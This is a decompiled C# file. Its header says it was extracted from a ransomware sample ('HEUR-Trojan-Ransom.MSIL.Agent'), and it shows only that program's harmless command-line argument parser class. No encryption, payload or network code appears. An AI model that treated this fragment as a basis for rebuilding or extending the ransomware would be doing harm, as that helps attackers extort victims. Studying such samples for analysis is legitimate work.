// Decompiled with JetBrains decompiler
// Type: ekati.Arguments
// Assembly: ekati, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 64E1DB8A-5658-4D89-86B9-E9E1034C5FE6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Agent.gen-b933cb32689517aac6e459d33e9d8c7c8f31f0710008bfa09d9e91c2526826ef.exe

using System.Collections.Specialized;
using System.Text.RegularExpressions;

namespace ekati
{
  public class Arguments
  {
    private StringDictionary Parameters;

    public Arguments(string[] Args)
    {
      this.Parameters = new StringDictionary();
      Regex regex1 = new Regex("^-{1,2}|^/|=|:", RegexOptions.IgnoreCase | RegexOptions.Compiled);
      Regex regex2 = new Regex("^['\"]?(.*?)['\"]?$", RegexOptions.IgnoreCase | RegexOptions.Compiled);
      string key1 = (string) null;
      foreach (string input in Args)
      {
        string[] strArray = regex1.Split(input, 3);
        switch (strArray.Length)
        {
          case 1:
            if (key1 != null)
            {
              if (!this.Parameters.ContainsKey(key1))
              {
                strArray[0] = regex2.Replace(strArray[0], "$1");
                this.Parameters.Add(key1, strArray[0]);
              }
              key1 = (string) null;
              break;
            }
            break;
          case 2:
            if (key1 != null && !this.Parameters.ContainsKey(key1))
              this.Parameters.Add(key1, "true");
            key1 = strArray[1];
            break;
          case 3:
            if (key1 != null && !this.Parameters.ContainsKey(key1))
              this.Parameters.Add(key1, "true");
            string key2 = strArray[1];
            if (!this.Parameters.ContainsKey(key2))
            {
              strArray[2] = regex2.Replace(strArray[2], "$1");
              this.Parameters.Add(key2, strArray[2]);
            }
            key1 = (string) null;
            break;
        }
      }
      if (key1 == null || this.Parameters.ContainsKey(key1))
        return;
      this.Parameters.Add(key1, "true");
    }

    public string this[string Param] => this.Parameters[Param];
  }
}
